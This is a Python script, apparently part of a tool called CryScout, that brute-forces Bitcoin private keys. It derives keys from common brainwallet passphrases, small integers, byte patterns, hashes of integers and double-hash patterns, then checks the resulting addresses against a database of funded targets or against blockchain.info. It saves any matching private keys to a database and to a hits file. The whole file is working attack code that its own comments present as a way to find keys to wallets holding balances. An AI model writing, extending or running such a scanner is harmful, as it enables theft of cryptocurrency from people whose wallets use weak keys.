#!/usr/bin/env python3
"""
CryScout Brainwallet & Weak-Key Scanner

Real attack vectors:
1. Brainwallet: SHA256(passphrase) → private key → address → check against targets/blockchain
2. Low-entropy keys: small integers, hex patterns, repeated bytes
3. Known-weak key patterns: SHA256 of common strings, sequential, etc.

This is historically the MOST successful Bitcoin key recovery method.
Brainwallets using weak passphrases have been drained many times.
"""

import hashlib
import sqlite3
import time
import os
import sys
import struct
import itertools

DB_FILE = "cryscout.db"

# secp256k1 parameters
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def privkey_to_addresses(privkey_int):
    """Convert a private key integer to Bitcoin addresses (P2PKH compressed + uncompressed)."""
    try:
        import ecdsa
        import base58
    except ImportError:
        return []

    if privkey_int <= 0 or privkey_int >= N:
        return []

    sk = ecdsa.SigningKey.from_secret_exponent(privkey_int, curve=ecdsa.SECP256k1)
    vk = sk.get_verifying_key()
    pub_uncompressed = b'\x04' + vk.to_string()
    pub_compressed = (b'\x02' if pub_uncompressed[64] % 2 == 0 else b'\x03') + pub_uncompressed[1:33]

    addresses = []
    for pub in [pub_compressed, pub_uncompressed]:
        sha = hashlib.sha256(pub).digest()
        h160 = hashlib.new('ripemd160', sha).digest()
        versioned = b'\x00' + h160
        checksum = hashlib.sha256(hashlib.sha256(versioned).digest()).digest()[:4]
        addr = base58.b58encode(versioned + checksum).decode()
        addresses.append(addr)

    return addresses


def sha256_hex(data):
    """SHA256 of bytes, return hex string."""
    return hashlib.sha256(data).hexdigest()


def load_targets():
    """Load all target addresses from DB."""
    conn = sqlite3.connect(DB_FILE)
    conn.execute("PRAGMA busy_timeout = 30000")
    cursor = conn.cursor()
    cursor.execute("SELECT address FROM addresses WHERE balance > 0")
    targets = set(row[0] for row in cursor.fetchall())
    conn.close()
    return targets


def save_hit(address, privkey_hex, method):
    """Save a recovered key."""
    conn = sqlite3.connect(DB_FILE)
    conn.execute("PRAGMA busy_timeout = 30000")
    conn.execute(
        "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?, ?, ?, datetime('now'))",
        (address, privkey_hex, method)
    )
    conn.commit()
    conn.close()

    hit = f"[BRAINWALLET HIT] Address: {address}, PrivKey: {privkey_hex}, Method: {method}\n"
    with open("hits.txt", "a") as f:
        f.write(hit)
    print(f"\n  [!!!] {hit.strip()}", flush=True)


def check_key(privkey_int, targets, method, passphrase=""):
    """Check if a private key matches any target address."""
    addrs = privkey_to_addresses(privkey_int)
    for addr in addrs:
        if addr in targets:
            privkey_hex = f"0x{privkey_int:064x}"
            label = f"{method}: '{passphrase}'" if passphrase else method
            save_hit(addr, privkey_hex, label)
            return True
    return False


def check_key_blockchain(privkey_int, method, passphrase=""):
    """Check if a private key has any balance via blockchain API (for non-target discovery)."""
    import requests
    addrs = privkey_to_addresses(privkey_int)
    if not addrs:
        return False

    try:
        q = "|".join(addrs)
        resp = requests.get(
            f"https://blockchain.info/multiaddr?active={q}&limit=0",
            timeout=15
        )
        if resp.status_code == 429:
            time.sleep(30)
            return False
        if resp.status_code == 200:
            for info in resp.json().get("addresses", []):
                bal = info.get("final_balance", 0)
                n_tx = info.get("n_tx", 0)
                if bal > 0 or n_tx > 0:
                    addr = info.get("address", "")
                    privkey_hex = f"0x{privkey_int:064x}"
                    label = f"{method}: '{passphrase}'" if passphrase else method
                    save_hit(addr, privkey_hex, label)
                    print(f"  [!!!] BALANCE FOUND: {addr} = {bal/1e8:.8f} BTC ({n_tx} txs) via {label}", flush=True)
                    return True
    except Exception as e:
        pass
    return False


# ============ PASSPHRASE GENERATORS ============

def gen_common_passphrases():
    """Common brainwallet passphrases that have been used historically."""
    # Single words (most common brainwallet pattern)
    common_words = [
        "password", "bitcoin", "satoshi", "blockchain", "crypto",
        "wallet", "money", "secret", "private", "key",
        "god", "love", "sex", "fuck", "hello",
        "test", "abc", "123", "qwerty", "letmein",
        "master", "dragon", "monkey", "shadow", "sunshine",
        "princess", "football", "charlie", "michael", "jesus",
        "freedom", "liberty", "america", "power", "trust",
        "winner", "loser", "hacker", "admin", "root",
        "hunter", "killer", "ninja", "pirate", "king",
        "queen", "prince", "diamond", "gold", "silver",
        "moon", "mars", "earth", "star", "galaxy",
        "zero", "one", "two", "three", "four",
        "five", "six", "seven", "eight", "nine",
        "ten", "hundred", "thousand", "million", "billion",
        "alpha", "beta", "gamma", "delta", "omega",
        "genesis", "exodus", "revelation", "trinity", "matrix",
        "nakamoto", "hal", "finney", "szabo", "back",
        # Common number patterns
        "1", "12", "123", "1234", "12345", "123456", "1234567",
        "12345678", "123456789", "1234567890",
        "0", "00", "000", "0000", "00000", "000000",
        "111", "222", "333", "444", "555", "666", "777", "888", "999",
        "1111", "2222", "3333", "4444", "5555", "6666", "7777", "8888", "9999",
        "11111111", "22222222", "33333333",
        # Common phrases
        "correct horse battery staple", "to be or not to be",
        "the quick brown fox", "lorem ipsum dolor sit amet",
        "i love bitcoin", "bitcoin is freedom", "in god we trust",
        "e pluribus unum", "semper fi", "carpe diem",
        "to the moon", "hodl", "not your keys not your coins",
        "be your own bank", "dont trust verify",
        # Technical patterns
        "0x0", "0x1", "0x00", "0xff", "deadbeef", "cafebabe",
        "ffffffff", "00000000", "aaaaaaa", "bbbbbbb",
        "", " ", "  ",  # empty/whitespace
    ]

    for word in common_words:
        yield word

    # Variations: with numbers appended
    for word in ["bitcoin", "password", "crypto", "wallet", "satoshi", "money", "secret"]:
        for suffix in ["1", "2", "3", "123", "!", "!!", "123!", "2009", "2010", "2011", "2012", "2013"]:
            yield word + suffix

    # Famous quotes/phrases truncated
    famous = [
        "shall i compare thee to a summers day",
        "to be or not to be that is the question",
        "i think therefore i am",
        "the only thing we have to fear is fear itself",
        "ask not what your country can do for you",
        "one small step for man",
        "i have a dream",
        "we hold these truths to be self evident",
    ]
    for phrase in famous:
        yield phrase

    # Email-like patterns
    for name in ["satoshi", "bitcoin", "admin", "user", "test"]:
        for domain in ["@gmail.com", "@bitcoin.org", "@hotmail.com"]:
            yield name + domain


def gen_low_entropy_keys():
    """Generate private keys with known low-entropy patterns."""
    # Small integers (1 through 1000)
    for i in range(1, 1001):
        yield i, f"small_int_{i}"

    # Powers of 2
    for exp in range(1, 256):
        yield 2**exp, f"pow2_{exp}"
        yield 2**exp - 1, f"pow2_{exp}_minus1"
        yield 2**exp + 1, f"pow2_{exp}_plus1"

    # Repeated byte patterns
    for byte_val in range(256):
        key = int.from_bytes(bytes([byte_val] * 32), 'big') % N
        if key > 0:
            yield key, f"repeated_byte_{byte_val:02x}"

    # Sequential byte patterns
    for start in range(0, 256, 8):
        key_bytes = bytes([(start + i) % 256 for i in range(32)])
        key = int.from_bytes(key_bytes, 'big') % N
        if key > 0:
            yield key, f"sequential_from_{start:02x}"

    # Fibonacci-derived
    a, b = 1, 1
    for i in range(300):
        a, b = b, a + b
        if a > 0 and a < N:
            yield a % N, f"fibonacci_{i}"

    # Pi, e, sqrt(2) digits as hex
    import decimal
    decimal.getcontext().prec = 80
    for name, val in [("pi", "3.14159265358979323846264338327950288419716939937510"),
                      ("e", "2.71828182845904523536028747135266249775724709369995"),
                      ("phi", "1.61803398874989484820458683436563811772030917980576")]:
        digits = val.replace(".", "")[:64]
        try:
            key = int(digits, 10) % N
            if key > 0:
                yield key, f"constant_{name}_decimal"
            key = int(digits[:64].ljust(64, '0'), 16) % N
            if key > 0:
                yield key, f"constant_{name}_hex"
        except:
            pass


def gen_sha256_of_integers():
    """SHA256 of integer strings — another common weak pattern."""
    for i in range(100000):
        h = hashlib.sha256(str(i).encode()).hexdigest()
        yield int(h, 16), f"sha256('{i}')"


def gen_double_sha256_patterns():
    """Double SHA256 and RIPEMD160 of common patterns."""
    for word in ["bitcoin", "satoshi", "password", "key", "wallet", "secret", "god", "love"]:
        # SHA256(SHA256(word))
        h1 = hashlib.sha256(word.encode()).digest()
        h2 = hashlib.sha256(h1).hexdigest()
        yield int(h2, 16) % N, f"sha256d('{word}')"

        # RIPEMD160(SHA256(word)) padded to 32 bytes
        h160 = hashlib.new('ripemd160', hashlib.sha256(word.encode()).digest()).digest()
        key = int.from_bytes(h160.ljust(32, b'\x00'), 'big') % N
        if key > 0:
            yield key, f"hash160('{word}')"


def update_heartbeat(total_checked, total_hits, current_phase):
    """Write worker heartbeat."""
    try:
        conn = sqlite3.connect(DB_FILE)
        conn.execute("PRAGMA busy_timeout = 30000")
        worker_id = f"BrainWallet-{os.getpid()}"
        task = f"{current_phase} ({total_checked} checked, {total_hits} hits)"
        conn.execute(
            "INSERT OR REPLACE INTO worker_status (worker_id, task, cpu_usage, ram_usage, last_heartbeat) VALUES (?, ?, 0.0, 0.0, datetime('now'))",
            (worker_id, task)
        )
        conn.commit()
        conn.close()
    except:
        pass


def main():
    print("CryScout Brainwallet & Weak-Key Scanner", flush=True)
    print("=" * 50, flush=True)

    targets = load_targets()
    print(f"Loaded {len(targets)} target addresses from DB", flush=True)

    use_blockchain = "--blockchain" in sys.argv or "-b" in sys.argv
    if use_blockchain:
        print("Mode: blockchain API balance checking (slow but thorough)", flush=True)
    else:
        print("Mode: target-matching only (fast, no API calls)", flush=True)

    total_checked = 0
    total_hits = 0
    batch_for_api = []  # accumulate keys to batch-check via API

    # Phase 1: Brainwallet passphrases (SHA256 of common strings)
    print("\n[Phase 1] Brainwallet passphrases...", flush=True)
    update_heartbeat(total_checked, total_hits, "Phase 1: Brainwallet passphrases")

    for passphrase in gen_common_passphrases():
        privkey_bytes = hashlib.sha256(passphrase.encode('utf-8')).digest()
        privkey_int = int.from_bytes(privkey_bytes, 'big')
        if privkey_int >= N or privkey_int == 0:
            continue

        if check_key(privkey_int, targets, "Brainwallet", passphrase):
            total_hits += 1
        elif use_blockchain:
            batch_for_api.append((privkey_int, "Brainwallet", passphrase))

        total_checked += 1
        if total_checked % 100 == 0:
            print(f"  Checked {total_checked} passphrases...", end="\r", flush=True)

    print(f"\n  Phase 1 done: {total_checked} passphrases checked", flush=True)

    # Phase 2: Low-entropy private keys
    print("\n[Phase 2] Low-entropy private keys...", flush=True)
    update_heartbeat(total_checked, total_hits, "Phase 2: Low-entropy keys")

    for privkey_int, label in gen_low_entropy_keys():
        if privkey_int >= N or privkey_int == 0:
            continue
        if check_key(privkey_int, targets, "LowEntropy", label):
            total_hits += 1
        elif use_blockchain:
            batch_for_api.append((privkey_int, "LowEntropy", label))

        total_checked += 1
        if total_checked % 500 == 0:
            print(f"  Checked {total_checked} keys...", end="\r", flush=True)

    print(f"\n  Phase 2 done: {total_checked} total checked", flush=True)

    # Phase 3: SHA256 of integers
    print("\n[Phase 3] SHA256 of integers (0-99999)...", flush=True)
    update_heartbeat(total_checked, total_hits, "Phase 3: SHA256(integers)")

    for privkey_int, label in gen_sha256_of_integers():
        if privkey_int >= N or privkey_int == 0:
            continue
        if check_key(privkey_int, targets, "SHA256_Int", label):
            total_hits += 1
        elif use_blockchain:
            batch_for_api.append((privkey_int, "SHA256_Int", label))

        total_checked += 1
        if total_checked % 5000 == 0:
            update_heartbeat(total_checked, total_hits, "Phase 3: SHA256(integers)")
            print(f"  Checked {total_checked} keys...", end="\r", flush=True)

    print(f"\n  Phase 3 done: {total_checked} total checked", flush=True)

    # Phase 4: Double-hash patterns
    print("\n[Phase 4] Double-hash patterns...", flush=True)
    update_heartbeat(total_checked, total_hits, "Phase 4: Double-hash")

    for privkey_int, label in gen_double_sha256_patterns():
        if check_key(privkey_int, targets, "DoubleHash", label):
            total_hits += 1
        total_checked += 1

    print(f"  Phase 4 done: {total_checked} total checked", flush=True)

    # Phase 5: Blockchain API batch check (if enabled)
    if use_blockchain and batch_for_api:
        print(f"\n[Phase 5] Blockchain API verification for {len(batch_for_api)} candidates...", flush=True)
        update_heartbeat(total_checked, total_hits, "Phase 5: Blockchain API check")

        for i, (privkey_int, method, passphrase) in enumerate(batch_for_api):
            if check_key_blockchain(privkey_int, method, passphrase):
                total_hits += 1
            if (i + 1) % 10 == 0:
                print(f"  API checked {i+1}/{len(batch_for_api)}...", end="\r", flush=True)
                time.sleep(1)  # Rate limit

        print(f"\n  Phase 5 done: {len(batch_for_api)} API checks", flush=True)

    # Summary
    print(f"\n{'='*50}", flush=True)
    print(f"COMPLETE: {total_checked} keys checked, {total_hits} hits", flush=True)
    update_heartbeat(total_checked, total_hits, "Complete")


if __name__ == "__main__":
    main()
